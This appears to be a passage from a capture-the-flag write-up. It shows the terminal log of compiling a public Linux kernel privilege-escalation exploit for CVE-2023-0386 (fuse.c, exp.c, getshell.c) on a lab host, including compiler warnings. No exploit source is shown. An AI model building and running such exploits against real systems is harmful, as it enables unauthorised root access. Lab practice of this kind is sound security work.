@@ -1,0 +1,31 @@
+admin@2million:/tmp/CVE-2023-0386$ make all
+gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
+fuse.c: In function ‘read_buf_callback’:
+fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
+  106 |     printf("offset %d\n", off);
+      |                    ~^     ~~~
+      |                     |     |
+      |                     int   off_t {aka long int}
+      |                    %ld
+fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
+  107 |     printf("size %d\n", size);
+      |                  ~^     ~~~~
+      |                   |     |
+      |                   int   size_t {aka long unsigned int}
+      |                  %ld
+fuse.c: In function ‘main’:
+fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
+  214 |     while (read(fd, content + clen, 1) > 0)
+      |            ^~~~
+      |            fread
+fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
+  216 |     close(fd);
+      |     ^~~~~
+      |     pclose
+fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
+  221 |     rmdir(mount_path);
+      |     ^~~~~
+/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
+(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
+gcc -o exp exp.c -lcap
+gcc -o gc getshell.c
